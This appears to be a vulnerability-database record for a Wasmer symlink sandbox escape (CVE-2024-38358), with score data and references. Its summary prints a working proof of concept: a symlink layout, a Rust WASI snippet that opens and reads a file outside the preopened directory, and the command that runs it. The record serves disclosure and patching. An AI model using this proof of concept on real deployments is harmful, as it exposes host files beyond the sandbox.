vulnerability_id: VCID-yaa9-px8g-aaaq
aliases:
  - CVE-2024-38358
  - GHSA-55f3-3qvg-8pv5
summary: |
  Symlink bypasses filesystem sandbox
  ### Summary

  If the preopened directory has a symlink pointing outside, WASI programs can traverse the symlink and access host filesystem if the caller sets both `oflags::creat` and `rights::fd_write`. Programs can also crash the runtime by creating a symlink pointing outside with `path_symlink` and `path_open`ing the link.

  ### Details



  ### PoC
  Setup a filesystem as follows.

  ```
  .
  ├── outside.file
  └── preopen
      └── dir
          └── file -> ../../outside.file
  ```

  Compile this Rust snippet with `wasi` v0.11 (for the preview1 API).

  ```rust
  fn main() {
      unsafe {
          let filefd = wasi::path_open(
              5,
              wasi::LOOKUPFLAGS_SYMLINK_FOLLOW,
              "app/dir/file",
              wasi::OFLAGS_CREAT,
              wasi::RIGHTS_FD_READ | wasi::RIGHTS_FD_WRITE,
              0,
              0,
          )
          .unwrap();
          eprintln!("filefd: {filefd}");

          let mut buf = [0u8; 10];
          let iovs = [wasi::Iovec {
              buf: buf.as_mut_ptr(),
              buf_len: buf.len(),
          }];

          let read = wasi::fd_read(filefd, &iovs).unwrap();

          eprintln!("read {read}: {}", String::from_utf8_lossy(&buf));
      }
  }
  ```

  Run the compiled binary with Wasmer preopening `preopen/`:

  ```
  wasmer run --mapdir /app:preopen a.wasm
  ```

  This should not print the contents of the `outside.file`. Other runtimes like Wasmtime can successfully block this call. But Wasmer prints the contents of the file.
severities:
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08953'
    published_at: '2025-04-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08966'
    published_at: '2025-04-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08897'
    published_at: '2025-04-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08784'
    published_at: '2025-04-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08732'
    published_at: '2025-04-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.0879'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.088'
    published_at: '2025-04-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08721'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08851'
    published_at: '2025-04-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08796'
    published_at: '2025-04-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08866'
    published_at: '2025-04-21 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08802'
    published_at: '2025-04-26 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08786'
    published_at: '2025-04-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00035'
    scoring_system: epss
    scoring_elements: '0.08928'
    published_at: '2025-04-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.11999'
    published_at: '2024-11-28 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.12052'
    published_at: '2024-12-03 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.12350'
    published_at: '2024-12-11 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.12407'
    published_at: '2024-12-13 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.12500'
    published_at: '2024-12-15 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.12070'
    published_at: '2024-12-17 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.12085'
    published_at: '2024-12-19 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.12135'
    published_at: '2024-12-27 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.12472'
    published_at: '2025-01-16 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.11446'
    published_at: '2024-11-01 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.11755'
    published_at: '2024-11-18 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.11846'
    published_at: '2024-11-20 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.11869'
    published_at: '2024-11-21 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.11936'
    published_at: '2024-11-23 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.11931'
    published_at: '2024-11-24 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00044'
    scoring_system: epss
    scoring_elements: '0.11942'
    published_at: '2024-11-26 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.0006'
    scoring_system: epss
    scoring_elements: '0.15998'
    published_at: '2025-04-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.0006'
    scoring_system: epss
    scoring_elements: '0.15875'
    published_at: '2025-03-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.0006'
    scoring_system: epss
    scoring_elements: '0.15832'
    published_at: '2025-03-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.0006'
    scoring_system: epss
    scoring_elements: '0.16009'
    published_at: '2025-04-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.0006'
    scoring_system: epss
    scoring_elements: '0.16033'
    published_at: '2025-04-04 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00061'
    scoring_system: epss
    scoring_elements: '0.16099'
    published_at: '2025-04-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00061'
    scoring_system: epss
    scoring_elements: '0.16069'
    published_at: '2025-04-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00061'
    scoring_system: epss
    scoring_elements: '0.16048'
    published_at: '2025-04-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00061'
    scoring_system: epss
    scoring_elements: '0.16007'
    published_at: '2025-04-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00061'
    scoring_system: epss
    scoring_elements: '0.16097'
    published_at: '2025-04-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00061'
    scoring_system: epss
    scoring_elements: '0.16061'
    published_at: '2025-04-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00061'
    scoring_system: epss
    scoring_elements: '0.16042'
    published_at: '2025-04-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00061'
    scoring_system: epss
    scoring_elements: '0.16062'
    published_at: '2025-04-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00061'
    scoring_system: epss
    scoring_elements: '0.16071'
    published_at: '2025-04-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00061'
    scoring_system: epss
    scoring_elements: '0.161'
    published_at: '2025-04-05 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: '0.00064'
    scoring_system: epss
    scoring_elements: '0.10875'
    published_at: '2025-03-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
  - score: LOW
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-55f3-3qvg-8pv5
  - score: '8.4'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/wasmerio/wasmer
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/wasmerio/wasmer
  - score: '2.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N
    published_at: None
    url: https://github.com/wasmerio/wasmer/commit/b9483d022c602b994103f78ecfe46f017f8ac662
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/wasmerio/wasmer/commit/b9483d022c602b994103f78ecfe46f017f8ac662
  - score: '2.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N
    published_at: None
    url: https://github.com/wasmerio/wasmer/security/advisories/GHSA-55f3-3qvg-8pv5
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/wasmerio/wasmer/security/advisories/GHSA-55f3-3qvg-8pv5
weaknesses:
  - CWE-22
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-38358
    reference_type:
    reference_id:
  - url: https://github.com/wasmerio/wasmer
    reference_type:
    reference_id:
  - url: https://github.com/wasmerio/wasmer/commit/b9483d022c602b994103f78ecfe46f017f8ac662
    reference_type:
    reference_id:
  - url: https://github.com/wasmerio/wasmer/security/advisories/GHSA-55f3-3qvg-8pv5
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-38358
    reference_type:
    reference_id: CVE-2024-38358
  - url: https://github.com/advisories/GHSA-55f3-3qvg-8pv5
    reference_type:
    reference_id: GHSA-55f3-3qvg-8pv5
